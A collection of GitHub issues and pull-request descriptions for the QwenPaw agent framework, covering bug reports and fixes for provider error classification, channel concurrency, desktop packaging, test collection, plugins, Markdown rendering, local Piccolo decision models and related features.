## 现象 / What happened

2026-10-30 早上三个 cron 任务（07:30 备份上云、08:00 早报、09:30 巡检）准点触发（日志有 `cron execute`），但全部失败，备用模型一次都没被尝试，飞书一条消息都没发出：

```
07:30:30 ERROR runtime: unhandled error ...: Error code: 400 - {'error': {'message': 'status_code=400, 请联系管理员处理！', 'type': 'upstream_error', 'code': 'bad_response_status_code'}}
08:00:12 ERROR runtime: unhandled error ...: Error code: 400 - {'error': {'message': 'status_code=400, 请联系管理员处理！', 'type': 'upstream_error', 'code': 'bad_response_status_code'}}
09:30:40 ERROR runtime: unhandled error ...: APIError('status_code=502, 请联系管理员处理！ (request id: ...)')
```

## 复现 / Reproduction

用日志里的**原始异常形态**直接喂 `classify_model_error()`（QwenPaw 2.2.2.post1 自带实现）：

```python
import openai
from qwenpaw.providers.model_error_policy import classify_model_error

class FakeRequest: method='POST'; url='http://x/v1/chat/completions'; headers={}
class FakeResp:
    status_code = 400
    headers = {}
    request = FakeRequest()

# 形态 A：网关把上游故障包装成 HTTP 400 + type=upstream_error
e1 = openai.BadRequestError(
    message="Error code: 400 - {'error': {'message': 'status_code=400, 请联系管理员处理！', 'type': 'upstream_error', 'code': 'bad_response_status_code'}}",
    response=FakeResp(), body=None)

# 形态 B：流中失败，SDK 抛裸 APIError，真实状态码只在消息文本里
e2 = openai.APIError(
    message='status_code=502, 请联系管理员处理！ (request id: ...)',
    request=FakeRequest(), body=None)

print(classify_model_error(e1))  # kind=bad_request  retryable=False fallback_eligible=False
print(classify_model_error(e2))  # kind=unknown      retryable=False fallback_eligible=False
```

实测输出：

```
08:00  400 upstream_error: 分类=bad_request  可重试=False  会切备用=False
09:30  裸APIError 502: 分类=unknown  可重试=False  会切备用=False
```

## 期望 / Expected

- **形态 B（本 issue 核心）**：`status_code=502` 明明白白写在消息里，应被 `extract_status_code()` 提取出来并归类为 `transient` → 可重试、可切换备用模型。
- **形态 A（顺带讨论）**：`type=upstream_error` + `bad_response_status_code` 表明是网关上游故障而非请求本身问题，但被包装成 HTTP 400 后按现有设计判为 `bad_request`（不 fallback）。这个可以理解设计初衷（400 通常意味着请求有问题），但网关把 5xx 包装成 400 是常见行为，`upstream_error` 这个 type 是否值得加入 transient 判定，请作者权衡。

## 源码位置 / Source

- `qwenpaw/providers/model_error_policy.py`：`fallback_eligible = retryable or kind == "model_not_found"`，`unknown`/`bad_request` 均不在内
- `qwenpaw/providers/error_utils.py`：`_STREAMING_ERROR_STATUS_RE` 只匹配 `Streaming response failed: [5xx]` 这一种文本格式，注释里也写明"keep this fallback deliberately narrow"

同类参考：#8092（阿里网关审核文本被误分类为 bad_request，同属"网关非标准错误形态导致分类失真"家族）、#8124（已修：审核错误路由到 fallback）。

谢谢！

issues.title: Feishu channel: intermittent `ProviderError: No active model configured` when a new message arrives while the agent is still processing the previous one
issues.body:
### Environment
- QwenPaw Desktop: v2.3.0-beta.1 (also reproduced on v2.2.2 - NOT introduced by the beta)
- OS: Windows 11 Pro 64-bit
- Channel: Feishu (channel message -> feishu:sw:<session>)

### Symptoms
- Intermittent "Internal error" shown in the Feishu chat when the user sends a new message while the agent is still processing the previous one in the SAME session.
- Retrying the same message succeeds immediately - no data loss, but frequent enough to be disruptive.
- Backend log (both versions):

```
ERROR | qwenpaw/runtime/runtime.py:193 | runtime: unhandled error session=...: No active model configured
qwenpaw.exceptions.ProviderError: No active model configured
ERROR | qwenpaw/app/channels/base.py:1038 | channel _stream_with_tracker failed: No active model configured, session=feishu:sw:..., agent=...
```

### Evidence that it is a concurrency race, not a config loss
- `active_model` is present the whole time (agent.json `active_model=kexin_token/glm-5.3-flash`; provider registry intact, 41 providers, all enabled).
- Timeline strictly correlates with concurrent sends: e.g. 18:24:33 fail -> 18:25:34 success; 18:25:49/18:25:53/18:26:02/18:26:15 four consecutive fails -> 18:26:21 success. Every failed attempt coincides with the previous message still being processed.
- Occurrence counts: 4 errors on 10-29 23:57 (still on v2.2.2, before upgrade), 28 errors 18:24-18:27, 1 error 19:19:11 (on v2.3.0-beta.1).
- Network/model API verified healthy at failure time (model API reachable in 0.04-0.12s) - rules out connectivity.

### Root cause (speculation)
When a new message arrives while the session's previous run is still active, the message handler builds the request before the model/session state is (re)bound, so it fails with "No active model configured" instead of being queued.

### Expected behavior
- Same-session concurrent messages should be queued (serialized) rather than rejected, or
- Fail with a clear, retryable "session busy" error instead of `ProviderError: No active model configured`.

### Suggested fix direction
Queue incoming channel messages per session while busy (or acquire the session lock before reading active model config).

issues.title: [Bug] Desktop build omits visual_compression assets → "FileNotFoundError: atlas-gray-native.ts", Visual Compact silently no-ops
issues.body:
## Summary

On the **desktop / PyInstaller build** of `2.3.0-beta.1` (Windows), Visual Compact never runs: the glyph atlases are not shipped, so every eligible model call raises

```
FileNotFoundError: <install>\binaries\qwenpaw-backend\_internal\qwenpaw\agents\context\visual_compression\assets\atlas-gray-native.ts
```

The middleware catches it and **fails open** (`Visual compression failed; sending the original request`), so the conversation continues unchanged and nothing is surfaced to the user.

`pip install qwenpaw` is **not** affected: `pyproject.toml` declares these files as `package-data` (`include-package-data = true`). Only the PyInstaller/Tauri bundle misses them.

## Environment

- QwenPaw Desktop `2.3.0-beta.1`, Windows 11 26H2 (build 26300.9807)
- default config: `light_context.visual_compact.enabled = true`, `effort = "low"`
- any model that reports `supports_image: true`

## Steps to reproduce

1. Install QwenPaw **Desktop** `2.3.0-beta.1` (Windows).
2. Keep the defaults (`enabled = true`, `effort = "low"`).
3. Build a conversation with **≥ 3 real user turns** and at least one image in a turn older than the last two (`HISTORY_KEEP_RECENT_TURNS = 2`).
4. Send one more message.
5. The log shows `Visual compression failed; sending the original request (model=… effort=low)` plus a `FileNotFoundError` traceback for the atlas path above.

## Root cause

`scripts/pack-tauri/qwenpaw.spec` collects package data from a **hard-coded directory whitelist**:

```python
_data_dirs = [
    ("agents/skills", "qwenpaw/agents/skills"),
    ("agents/md_files", "qwenpaw/agents/md_files"),
    ("tokenizer", "qwenpaw/tokenizer"),
    ("security/tool_guard/rules", "qwenpaw/security/tool_guard/rules"),
    ("security/skill_scanner/rules", "qwenpaw/security/skill_scanner/rules"),
    ("security/skill_scanner/data", "qwenpaw/security/skill_scanner/data"),
    ("app/channels/yuanbao/proto", "qwenpaw/app/channels/yuanbao/proto"),
    ("providers/data", "qwenpaw/providers/data"),
]
```

`agents/context/**` is not in the list, so `_internal/qwenpaw/agents/` ships only `md_files` and `skills`. The runtime resolves the atlas relative to the frozen module:

```python
# rendering/renderer.py
_ASSET_ROOT = Path(__file__).resolve().parent.parent / "assets"
_DENSE_ATLAS_PROFILES = {
    "low":    (_ASSET_ROOT / "atlas-gray-native.ts",   8, 16),
    "medium": (_ASSET_ROOT / "atlas-gray-readable.ts", 6, 13),
    "high":   (_ASSET_ROOT / "atlas-gray.ts",          5,  8),
}
```

→ the path it looks for cannot exist in the bundled layout. The same whitelist is on `main`, so the next desktop build will most likely miss it as well.

## Suggested fix

```diff
 _data_dirs = [
     ("agents/skills", "qwenpaw/agents/skills"),
     ("agents/md_files", "qwenpaw/agents/md_files"),
+    (
+        "agents/context/visual_compression/assets",
+        "qwenpaw/agents/context/visual_compression/assets",
+    ),
     ("tokenizer", "qwenpaw/tokenizer"),
```

(≈23 MB; the three `*_LICENSE.txt` files in that directory should be shipped too.)

## Two further suggestions

1. **Startup self-check**: if `visual_compact.enabled` is true but the configured atlas is missing, log one `WARNING` at boot (optionally auto-disable the feature) instead of raising on every request.
2. **Rate-limit the log**: the fail-open path currently emits a full traceback per model call; one line per session plus a counter is enough.

## Workaround for other desktop users

Copy the three atlases (and the three license files) from the tag into
`<install>\binaries\qwenpaw-backend\_internal\qwenpaw\agents\context\visual_compression\assets\`.
They exist in the source tree at `src/qwenpaw/agents/context/visual_compression/assets/` (`atlas-gray-native.ts` = 12,157,200 B, `atlas-gray-readable.ts` = 7,576,000 B, `atlas-gray.ts` = 4,093,877 B). Desktop upgrades recreate the `binaries` folder, so the copy has to be redone afterwards.

Raw logs can be provided on request if useful.

prs.title: fix(providers): read a gateway-reported status from the error text
prs.body:
## Description

`extract_status_code()` reads a status from the exception's `status_code`, `code`, `response`, and `body`/`details` fields, and falls back to the message text for one narrow gateway format — `Streaming response failed: [503] ...`.

An OpenAI-compatible gateway that fails mid-stream can instead report the status only inside the message text, for example `status_code=502, 请联系管理员处理！ (request id: ...)`. The OpenAI SDK raises a base `APIError` for such a response: no `status_code`, no `response`. The real status is present in the text, but the fallback does not recognise that shape, so `classify_model_error()` returns `unknown` — no same-model retry, no cross-model fallback, and the turn or scheduled job dies. The same upstream failure wrapped as a real HTTP 502 is `transient` and does fall back, so identical failures behave differently only because of how the gateway phrased them.

This adds one more narrow pattern for gateway error text, keeping the same deliberate narrowness the existing fallback documents: only `4xx`/`5xx` are read, so a success code quoted in a message (`expected status_code=200`) is never mistaken for a failure, and unrelated three-digit numbers in provider messages are still ignored.

**Related Issue:** Fixes #8505

**Security Considerations:** None — this only affects how a provider error is classified, never what is sent to a provider.

## Type of Change

- [x] Bug fix
- [ ] New feature
- [ ] Breaking change
- [ ] Documentation
- [ ] Refactoring

## Component(s) Affected

- [ ] Core / Backend (app, agents, config, providers, utils, local_models)
- [ ] Console (frontend web UI)
- [ ] Channels (DingTalk, Lark, QQ, Discord, iMessage, etc.)
- [ ] Skills
- [ ] CLI
- [ ] Documentation (website)
- [ ] Tests
- [ ] CI/CD

- [x] I ran `pre-commit run --all-files` locally — every hook covering the files this PR touches passes; the run as a whole still reports the pre-existing pylint findings in files this PR does not touch, and it exits 1 with or without this change (see Evidence)
- [ ] If pre-commit auto-fixed files, I committed those changes and reran checks
- [x] I ran tests locally (`pytest` or as relevant) — the relevant suites pass; the full unit run has 10 failures that reproduce on the base commit without this change (see Evidence)
- [ ] Documentation updated (if needed)
- [ ] Ready for review

## Testing

prs.title: fix(tests): let a full pytest run collect both test_backup modules
prs.body:
## Description

CONTRIBUTING.md lists the required local gate as:

```bash
pip install -e ".[dev,test,full]"
pre-commit install
pre-commit run --all-files
pytest
```

On a clean checkout of `main` the last command aborts during collection and exits 2:

```
import file mismatch:
imported module 'test_backup' has this __file__ attribute:
  .../tests/integration/test_backup.py
which is not the same as the test file we want to collect:
  .../tests/unit/routers/test_backup.py
...
ERROR tests/unit/routers/test_backup.py
!!!!!!!!!!!!!!!!!!!! Interrupted: 1 error during collection !!!!!!!!!!!!!!!!!!!!
20810 tests collected, 1 error in 61.97s
```

`tests/unit/routers/` has no `__init__.py`, so with pytest's default `prepend` import mode the module
name of a test file is derived from its basename whenever the containing directory is not a package.
`tests/unit/routers/test_backup.py` and `tests/integration/test_backup.py` are therefore both
imported as the module `test_backup`, and the second import fails the file-mismatch check.

This PR adds the missing empty `tests/unit/routers/__init__.py`, which gives the files in that
directory the package-qualified module name `tests.unit.routers.*` and removes the collision.

`tests/integration/` has no `__init__.py` either, but all of its helper imports are already
package-qualified (`from tests.integration.helpers import ...`), so it needs no change and is left
untouched. Renaming a test file instead would break the path for anyone referencing it, and would
collide with the existing `tests/integration/test_backup_router.py`.

**Related Issue:** Fixes #8377

**Security Considerations:** Not applicable. The change only affects pytest module naming; no runtime
code, dependency, configuration or public API is touched.

prs.title: fix(plugins): keep a failing import-cache refresh from taking out the plugin system
prs.body:
## Description

Every backend plugin failed to load on hosts whose interpreter is CPython 3.11.9+ but whose `importlib.metadata` is older (Debian 12 ships 3.11.2): `importlib.invalidate_caches()` raises `TypeError: MetadataPathFinder.invalidate_caches() missing 1 required positional argument: 'cls'`, and the call was unguarded in `PluginNamespaceFinder.register()`, which runs once per backend plugin during startup. One raising stdlib call took out the whole plugin system instead of one plugin.

This change makes the import-cache refresh best effort: the failure is logged at debug level and the caller continues.

**Related Issue:** Fixes #8473

**Security Considerations:** None. The refresh is a cache invalidation; failing to refresh it can only make an import resolve to a stale entry for the rest of the process, which is what the call was already trying to avoid.

## Type of Change

- [x] Bug fix
- [ ] New feature
- [ ] Breaking change
- [ ] Documentation
- [ ] Refactoring

## Component(s) Affected

- [ ] Core / Backend (app, agents, config, providers, utils, local_models)
- [ ] Console (frontend web UI)
- [ ] Channels (DingTalk, Lark, QQ, Discord, iMessage, etc.)
- [ ] Skills
- [ ] CLI
- [ ] Documentation (website)
- [x] Tests
- [ ] CI/CD
- [ ] Scripts / Deploy

## Why the call can fail

Since CPython 3.11.9 the frozen `PathFinder.invalidate_caches()` ends with:

```python
from importlib.metadata import MetadataPathFinder
MetadataPathFinder.invalidate_caches()
```

`MetadataPathFinder` is resolved through `sys.path`. When an older distro stdlib sits ahead of the bundled one, that name resolves to a plain function without `@classmethod`, so the call raises `TypeError`.

Reproduced on CPython 3.12.15 by replacing `MetadataPathFinder.invalidate_caches` with a plain function, which is the shape the pre-3.11.9 stdlib has:

```
bundled MetadataPathFinder.invalidate_caches: classmethod
importlib.invalidate_caches() -> TypeError: plain_invalidate_caches() missing 1 required positional argument: 'cls'
```

## The change

`src/qwenpaw/plugins/module_isolation.py` gains `_invalidate_import_caches()`, which calls `importlib.invalidate_caches()` inside a `try`/`except` and logs the failure at debug level. Both call sites in the module — `PluginNamespaceFinder.register()` and `clear_plugin_bytecode()` — go through it.

This covers the startup path of #8473. The install path of #8265 is a different call site; #8345 and #8107 are open against it, and this change does not touch `loader.py`.

- [x] If pre-commit auto-fixed files, I committed those changes and reran checks
- [x] I ran tests locally (`pytest` or as relevant) and they pass
- [x] Documentation updated (if needed)
- [x] Ready for review

`tests/unit/plugins/test_plugin_cache_invalidation.py` covers the behaviour directly: a plugin registers even when the stdlib refresh raises, the refresh is still attempted, and the failure is swallowed.

## Evidence

prs.title: feat(transcription): make the Whisper API model name configurable
prs.body:
## Description

Settings → Transcription let users pick a Whisper-API provider, but there was
**no way to view or set the model name**. `transcription_model` stayed at its
`"whisper-1"` default, so any provider whose model id differs from OpenAI
(SiliconFlow's `FunAudioLLM/SenseVoiceSmall`, local Whisper servers, …) failed
every request with `400 Model does not exist` — while the UI reported the
configuration as saved successfully. The only workaround was editing
`~/.qwenpaw/config.json` by hand.

This adds the missing write path:

**Backend** — `GET/PUT /workspace/transcription-model`, mirroring the existing
`transcription-provider` endpoints. `PUT` trims the value; an empty string
resets to the built-in default (the reader already treats empty as
`"whisper-1"`).

**Console** — `getTranscriptionModel` / `updateTranscriptionModel` API
wrappers; a model-name input in the Voice Transcription settings, shown for
the Whisper API provider type and autosaved alongside the provider; and the
new strings translated in every locale.

as the existing `transcription-provider` endpoints.

prs.title: fix(channels): repair CJK emphasis boundaries in rendered Markdown
prs.body:
## What Problem This Solves

When a model bolds CJK text it often leaves a sentence-ending punctuation mark inside the closing emphasis delimiter, e.g.:

```
**没有改动任何设置。**所有内容保持不变。
```

CommonMark's "flanking" rules classify CJK sentence punctuation as Unicode punctuation, and CJK text has no inter-word spaces. The closing `**` therefore sits between punctuation and CJK text, is judged "not a valid closer", and the raw markers leak into the rendered output: the reader literally sees `**没有改动任何设置。**`.

This affects QwenPaw's own surfaces (TUI, web console) and every Markdown-rendering channel (QQ, Telegram, Slack, ...). Example (real QQ output):

```
主人，**重点**。后面的**没有改动任何设置。**所有内容保持不变。
```

## Fix

Add `normalize_cjk_emphasis` in `qwenpaw.utils.markdown_cjk`, which moves the trailing CJK punctuation run outside the delimiter (`**中文。**后` becomes `**中文**。后`), and apply it where QwenPaw renders Markdown itself:

- `MessageRenderer.message_to_parts` — when the channel's `RenderStyle.supports_markdown` is set, repair the assistant text before the part is created. Covers QQ / Telegram / Slack / ...
- TUI `AssistantMessage` — repair once the answer is finalized (`finalize()`), so streaming deltas stay untouched and the live view does not flicker.

The repair is deliberately conservative and display-oriented:

- only `*`, `_`, `**`, `__`, `***`, `___` are considered;
- only `。！？；：，、…` plus full-width trailing closers (`”’」』】》〉）〕］`) are moved;
- only when the delimiter is immediately followed by Han / Hiragana / Katakana / Hangul;
- fenced, indented and inline code, escaped delimiters, CRLF endings and unrelated unfinished Markdown are preserved verbatim.

## Evidence

- `pytest tests/unit/utils/test_markdown_cjk.py tests/unit/app/channels/test_renderer.py -q` -> **60 passed**
- `pytest tests/unit/utils tests/unit/app/channels -q` -> **930 passed, 7 skipped**
- Direct behaviour checks:
  - `normalize_cjk_emphasis("**没有改动任何设置。**所有内容保持不变。")` -> `"**没有改动任何设置**。所有内容保持不变。"`
  - `normalize_cjk_emphasis("**重点**后接中文")` -> unchanged
  - `MessageRenderer().message_to_parts(<TextContent "**没有改动任何设置。**所有内容">)[0].text` -> repaired
  - `RenderStyle(supports_markdown=False)` -> text left untouched
  - fenced code block containing `**代码。**后` -> left untouched
- `pre-commit run --files <changed files>` -> all 17 hooks pass.

## Notes

- This is a targeted, display-oriented repair, not a general Markdown parser: ASCII punctuation and non-CJK followers are out of scope by design.
- Related: CommonMark discussion `commonmark/commonmark-spec#650` on CJK-friendly emphasis.

prs.title: fix(agents): drop empty media blocks before formatting requests
prs.body:
## What Problem This Solves

A media `DataBlock` whose base64 payload is empty (e.g. a tool returning a
zero-byte image) was serialized by the formatters as an empty data URI:

```json
{"type": "image_url", "image_url": {"url": "data:image/png;base64,"}}
```

Every provider rejects this — OpenAI answers with *"Image data cannot be
empty"*.

## Fix

- Add `_is_empty_media_block()`: a media/data block whose `base64` source has a
  zero-length `data` payload.
- Strip such blocks in `normalize_messages_for_model_request()` **before** the
  multimodal branching — no endpoint accepts an empty data URI, so this runs
  regardless of multimodal support.
- Reuses the existing strip machinery via a new `empty_only` mode, so tool-result
  nesting and the `MEDIA_UNSUPPORTED_PLACEHOLDER` fallback behave like the other
  media-stripping paths.
- URL sources are left untouched: their emptiness cannot be determined without
  fetching them.

## Evidence

Reproduced and verified locally:

- Before: a `Msg` with `DataBlock(source=Base64Source(data="", media_type="image/png"))`
  formats to `{"type": "image_url", "image_url": {"url": "data:image/png;base64,"}}`.
- After: the empty block is dropped (only the sibling text remains); no empty
  data URI is emitted.
- `pre-commit run --files <changed>` → all 17 hooks passed.
- `pytest tests/unit/agents/test_message_request_normalizer.py` → 41 passed; the
  normalizer + cross-provider + model-factory suites → 380 passed.

## Notes

- Based on `main`.

prs.title: fix(skill): avoid scanner false positive in make-skill validator
prs.body:
## Description

The built-in `make-skill` is blocked by QwenPaw's own skill security scanner when it is imported into the skill pool or a workspace:

```
[CRITICAL] Dangerous code execution functions that can execute arbitrary code
(scripts/validate_skill.py:432) rule_id=COMMAND_INJECTION_EVAL
```

The flagged line is the validator's syntax check for generated scripts:

```python
compile(path.read_bytes(), relative, "exec")
```

`compile()` only produces a code object, which is never executed here, so this is a false positive. However, `COMMAND_INJECTION_EVAL` matches any bare `compile(` call. This PR replaces it with `py_compile.compile(..., doraise=True)`, writing to a temporary directory. It keeps the compile-stage checks, does not execute the script and leaves the Skill unchanged. The check moves into a small `_python_error` helper, applied identically to `make-skill-en` and `make-skill-zh`.

I chose to fix the skill rather than relax the scanner rule, since loosening a CRITICAL rule to let one built-in pass seems like the wrong trade.

**Related Issue:** Relates to #8320 (same validator, different failure)

**Security Considerations:** The scanner rule is untouched. Generated scripts are compiled but never executed.

prs.title: feat(models): run local Piccolo with bidirectional candidate scoring
prs.body:
## Description

Allow downloaded Piccolo models to supply QwenPaw's native Jev decisions for automatic tool review and ReMe context compaction. Piccolo uses bidirectional prompt attention and candidate-token scoring, so a causal Chat Completions adapter cannot reproduce its trained inference behavior.

- Reuse AgentScope's Jev question/answer mapping and call the managed llama.cpp runtime's native `/v1/systemone` endpoint, with request compression disabled. Read candidate-token probabilities instead of generating probability JSON.
- Preserve the existing Download → Start → default Decision model flow and the separate automatic-review and decision-compaction switches. Starting Piccolo does not enable either feature or change another provider's chat selection.
- Group the local selector into independently scrollable **Chat models** and **Decision models** sections, with Chinese labels **对话模型** and **决策模型**. Remove the redundant Local Models heading, Piccolo purpose subtitle, and blue repository links. Keep a single managed runtime.
- Use current `agentscope-ai` Hugging Face repositories for QwenPaw-Flash recommendations; preserve stored IDs for existing downloads and their lifecycle actions.
- Recommend separate `agentscope-ai/Piccolo-{4,9,27}B-BF16` and `-Q8_0` repositories according to machine memory. BF16 downloads use the standard complete GGUF shard set, with known total sizes; BF16 repository IDs retain the native decision role through download, restart and activation. Recognize only the Piccolo family IDs; no legacy Blink repository or cache aliases are added. Preserve the decision role after download, restart, and API activation. Download GGUF/runtime metadata only.
- Launch Piccolo with a complete-prompt budget, one slot, no prompt cache, and no context shifting. Reject runtimes that report Piccolo as a text-generation model.
- Include a focused companion llama.cpp patch and build instructions in `docs/local-piccolo.md`. Ordinary Ollama Chat Completions is not enabled for this contract.

The companion patch targets llama.cpp `f4d8af608a6b39946406f9439edfb6e83ca6a923`. It adds Piccolo metadata and the checkpoint's exact `flex_twice` layout to the existing native SystemOne implementation. Full-attention layers use bidirectional prompt attention; linear-attention layers keep their native computation. Candidate softmax at temperature 1 is equivalent to renormalizing the candidate token log probabilities. No answer tokens are generated.

**Related work:** Reuses the decision configuration and review integration in #8205 and #8360.

**Security considerations:** Existing approval thresholds, human-confirmation fallback, context recovery, and opt-in switches remain in control. Candidate probabilities are model outputs, not a calibration or safety guarantee.

## Type of Change

- [x] New feature
- [x] Documentation
- [x] Refactoring
- [ ] Breaking change

## Components

Local model lifecycle and catalog, provider adapter, Console capability detection, English model guide, and tests. No workflow files are changed.

## Evidence

- Scope cleanup: 174 focused backend/API tests and 35 selector tests passed. Keep the existing Start request shape and integer model-size schema; runtime metadata selects the decision role. No runtime source dependency on the Piccolo repository is added.
- BF16 catalog follow-up: 177 focused backend/API tests and 35 model-selector tests passed, covering memory boundaries, GGUF-only downloads, BF16 decision identity and existing Start controls. Changed Python hooks and Prettier passed.
- Rename follow-up: 188 focused backend tests and 34 model-selector tests passed. The renamed companion patch applies to the pinned source.
- 258 focused backend tests passed (one existing tar extraction deprecation warning).
- 5 relevant Console test files / 117 tests passed; production frontend build passed.
- Changed Python hooks passed: AST, encoding, private-key scan, whitespace, trailing commas, mypy, Black, flake8, and pylint. Changed Console/docs passed Prettier. The full-repository pre-commit run is not claimed as passing; unrelated formatter/actionlint bootstrap and full CI remain outstanding.
- Companion runtime: 49 server-component tests / 191 assertions passed. The patch applies cleanly to the pinned upstream source.
- Exact C++ versus checkpoint-tokenizer comparison: 33 cases across three tokenizers, 78 prompt rows, including 255 options, ordered scores, Chinese, special tokens, and non-repeated long prompts.
- Complete original 4B, 9B, and 27B checkpoints ran in the Transformers reference. BF16 and Q8 GGUFs were compared on four smoke questions per size. Q8 maximum absolute candidate probability differences were approximately 0.00564 / 0.00286 / 0.00298, with matching top choices.
- On a Mac M4 Pro, the complete 4B checkpoint ran through the CPU reference, and 4B Q8 GGUF ran on Metal through the actual native classifier, `assess_tool_call()`, and ReMe decision component. These smoke tests did not execute a reviewed tool or change approval settings.

### Local model selector

English:

![English local model selector](https://raw.githubusercontent.com/Xinji-Mai/QwenPaw/58d7ec350cfd83e3fe8313115f2971820aa564b9/docs/images/local-models-en.png)

Chinese:

![Chinese local model selector](https://raw.githubusercontent.com/Xinji-Mai/QwenPaw/58d7ec350cfd83e3fe8313115f2971820aa564b9/docs/images/local-models-zh.png)

## Limitations and release status

A Piccolo-compatible llama.cpp binary is required; the companion patch is not in a released upstream binary. The build/install step is documented and the capability gate rejects an incompatible runtime. The local runtime serves one model at a time. This initial Piccolo integration caps each complete question prompt at 8,192 tokens, including repeated layout, to bound full-attention memory allocation even when the shared chat window is 64K. Oversized prompts fail to the existing fallback.

The complete 4B, 9B and 27B checkpoints and their Q8_0 and Q4_K_M variants are public under `agentscope-ai/Piccolo-{4,9,27}B`, with separate `-Q8_0` and `-Q4_K_M` repositories. All nine renamed repositories were independently checked for public revisions, manifest file sizes and unchanged LFS weight hashes. Model cards retain Apache-2.0 and FlexDM attribution. The catalog now recommends BF16 as well as Q8_0 according to memory; Q4_K_M can be downloaded by repository ID. BF16 uses separate `Piccolo-{4,9,27}B-BF16` repositories. All three BF16 repositories are now public. Their complete standard GGUF shard sets (4B: 8.42 GB / 2 shards; 9B: 17.92 GB / 4 shards; 27B: 53.81 GB / 12 shards) were independently checked against the published HEAD, file sizes and SHA-256 receipts. Its model cards disclose the expanded synthetic 265-request / 556-judgment regressions and measured differences. Repository existence or successful loading is not a task-quality benchmark.

Native QwenPaw download completed against the public 4B Q8 repository, reusing a local GGUF cache after remote SHA-256 verification. The Mac managed Start flow subsequently passed in approximately 7.07 seconds and advertised the native decisions capability. The actual QwenPaw-managed runtime then passed classifier, automatic-review, and ReMe compaction smoke calls (1.77-second classifier, 3.10-second review, 0 generated answer tokens). An earlier startup SIGKILL did not reproduce on retry; its cause remains unestablished.

The PR runtime evidence consists of smoke comparisons. The separately published Q4 artifacts also include expanded synthetic numerical regressions; neither establishes task-quality, probability-calibration, or safety performance. The recommendation tiers are 16/24/48 GB for Q8 and 24/32/80 GB for BF16 (4B/9B/27B). These are catalog policies that reserve room for runtime buffers, not measured peak-memory guarantees; exact platform/context usage still requires broader measurement.

## Local inference budgets

The local 4B Q4 review prefill measured 3.3–4.4 seconds, so the previous four-second deadline could fall back to human approval before a valid result arrived. Local review requests default to 7 seconds; the compaction classifier client retains its 30-second default. Explicit lower timeouts remain respected. Remote Jev defaults and all approval thresholds are unchanged.

For local ReMe compaction, cap the existing evidence packer at 1,600 state tokens and 4,096 request tokens with one batch in flight. Give model inference 80% of the configured total deadline (24 seconds of the default 30), leaving time for validation and atomic commit. Unanswered or oversized evidence remains verbatim. User settings, recent-message protection, archive references and the original fallback remain intact.

The synthetic live compaction fixture reduced formatted input from 10,432 to 6,670 tokens in 24.0 seconds, retaining the order evidence, latest user message and six recent messages. These are budget regression measurements on the local 4B setup, not task-quality or safety-calibration results. Review remains conservative: the file-write and printf fixtures still requested approval; the bounded line-count command was classified low risk and completed through the real JEV-mode chat path.

Validation: 697 tests across the full context suite and local provider/governance gates pass; the nine relevant Python hooks pass. The full hook command could not initialize the unrelated Prettier environment because npm rejects its Git package installation (`EALLOWGIT`); the unchanged Python hooks were run with that unrelated hook excluded. Full-repository CI remains unclaimed.

## Checklist

- [x] Relevant tests and changed-file checks pass
- [x] Documentation updated
- [x] Complete-checkpoint and native runtime smoke validation recorded
- [ ] Full-repository checks and CI completed
- [x] Ready for review

Ready for maintainer review. Full CI and required environment approvals remain pending; the companion runtime requires the documented manual installation or follow-up packaging.

prs.title: fix(channels): recheck idle queues after awaiting consumer shutdown
prs.body:
## Description

Idle cleanup first collects eligible queues, then awaits each consumer's shutdown. If consumer A is slow to stop and a new message arrives in candidate B meanwhile, the saved candidate list is stale: cleanup still removes B and cancels its consumer, dropping the new message.

Keep each candidate's `QueueState` identity and recheck identity, emptiness and the idle deadline under the lock immediately before removal. The existing timeout, priority and batching behavior is preserved.

**Related Issue:** Fixes #7895

This is separate from the old-consumer/unregistration race addressed in #7547 and #6373. The message-delivery regression still fails against #7547 at `1d4104f191ce281402315bc7cfa81ffff53f4f0a`; this patch does not change `_run_consumer` cleanup or add consumer timeouts.

prs.title: fix(loop): exempt read-only tools from doom loop detection (#5906)
prs.body:
## Problem

`DoomLoopGate` with `similarity_threshold=1.0` flags legitimate repeated read-only tool calls as doom loops. Users reading memory 3+ times get a warning; 6+ times gets terminated — making normal memory recall trigger doom loop false positives.

**Issue:** #5906

## Root Cause

`DoomLoopGate.record()` and `_auto_record_from_ctx()` count ALL tool calls equally, including read-only tools that are legitimately called repeatedly (e.g. recalling conversation history, reading files).

## Fix

Add `exempt_tools` config to `DoomLoopConfig` (default: `["recall_history", "recall_history_python", "read_file"]`). `DoomLoopGate` skips recording any tool in the exempt set, so repeated read-only calls never enter the sliding window.

Key insight: `recall_history_python` is the sandboxed REPL that is the **default** recall tool in scroll context. `recall_history` (structured) is only the fallback for environments without a sandbox (e.g. Windows without WSL2). Both must be exempt — omitting `recall_history_python` leaves the main code path unfixed.

## P1 Fix (control flow bug found during review)

`_auto_record_from_ctx` previously advanced `last_recorded_iter` before checking exempt — an exempt tool as the last call in context would swallow non-exempt calls earlier in the same iteration. Now: `last_recorded_iter` advances only after a record is appended or the iteration is fully scanned; exempt tools use `continue` (not `return`) so earlier non-exempt calls are still found.

## Trade-off

Fully exempting read-only tools means a model stuck in an infinite read-only loop is invisible to this gate and will burn tokens unchecked. This is an accepted hotfix cost — the alternative (higher tolerance instead of full exempt) is tracked as a follow-up.

## Changes

- `config.py`: Add `exempt_tools` field to `DoomLoopConfig` (includes `recall_history_python` for default scroll context path)
- `doom_loop.py`: Add `exempt_tools` param; skip in `record()` and `_auto_record_from_ctx()` (with `continue` + deferred iter advance); document trade-off in `__init__` comment
- `react_gates.py`: Pass `exempt_tools` from config to `DoomLoopGate`
- `goal/helpers.py`: Same wiring for `/goal` mode
- `test_doom_loop_gate.py`: 12 new tests covering exempt behavior, P1 swallow scenario, `recall_history_python` main path, and all-exempt iter advancement

## Test Results

All 34 tests in `tests/unit/loop/` pass (12 new + 22 existing), zero regression.

prs.title: fix(context): support slow summary models and consistent token limits
prs.body:
## Description

Scroll summary requests can fail with HTTP 400 on OpenAI-compatible providers when a model card sets `generate_kwargs.max_tokens`: AgentScope 2.0.10 injects `max_completion_tokens` while Scroll also passes `max_tokens`. Keep configured output limits unchanged until the compatibility boundary, resolve one output-token parameter for the request, and normalize defaults and per-call overrides separately before merging. Summary limits can then override configured defaults for GLM, GPT and o-series models.

Preserve an explicit `max_completion_tokens` in provider configuration, model configuration or per-call arguments, including custom Azure deployment names such as `production-reasoner`. Deployment aliases do not reliably identify the underlying model family. A per-call summary cap still overrides the configured value, and only one output-token parameter reaches the SDK. Configuration dictionaries remain unchanged.

